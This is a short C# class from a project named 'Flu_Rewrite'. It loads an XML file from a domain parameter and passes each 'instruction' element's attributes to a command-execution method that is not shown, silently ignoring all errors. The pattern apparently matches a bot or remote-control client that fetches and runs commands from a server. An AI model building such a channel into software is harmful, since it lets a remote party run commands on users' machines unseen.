using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;

namespace Flu_Rewrite
{
    class LectorXML
    {

        private static XmlDocument XDoc = new XmlDocument();

        public static Boolean CargarInstrucciones(String Dominio)
        {
            try { XDoc.Load(Dominio); return true; }
            catch { return false; }
        }

        public static void EjecutarComandos()
        {
            //TODO: Actualizar esto a LINQ para mejorar el rendimiento
            try
            {
                XmlNode Nodos = XDoc.DocumentElement;
                foreach (XmlNode Nodo in Nodos)
                {
                    XmlNodeList Instrucciones = XDoc.GetElementsByTagName("instruction");
                    foreach (XmlNode Instruccion in Instrucciones)
                    {
                        EjecucionComandos.Ejecutar(Instruccion.Attributes[0].Value.ToString(), Instruccion.Attributes[1].Value.ToString());

                    }
                }
            }
            catch { }
        }
    }
}
